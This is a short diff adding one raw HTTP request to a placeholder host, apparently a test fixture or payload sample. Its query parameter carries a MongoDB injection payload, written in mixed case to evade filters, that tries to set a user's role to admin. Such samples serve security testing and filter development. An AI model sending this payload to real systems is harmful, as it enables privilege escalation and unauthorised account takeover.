@@ -1,0 +1,4 @@
+GET /a?input=dB.uSeRs.UpDaTe({"U":"x"},{$SeT:{"rOlE":"aDmIn"}}) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
